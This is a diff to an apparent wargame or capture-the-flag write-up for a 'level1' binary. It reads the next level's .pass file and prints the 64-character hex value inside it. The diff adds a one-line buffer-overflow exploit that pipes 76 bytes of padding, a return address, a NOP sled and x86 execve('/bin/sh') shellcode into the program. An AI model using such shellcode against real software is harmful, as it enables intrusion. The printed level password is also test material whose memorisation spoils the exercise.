@@ -11,3 +11,6 @@ We can then run `whoami` in the newly opened shell, where we can see we are `lev
 cd ../level2
 cat .pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+We also managed to actually run shellcode through this exploit, like so, which gives the same result:
+(python -c "print 'a' * 76 + '\xbf\xff\xf7\x20'[::-1] + '\x90' * 32 + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"; cat) | ./level1
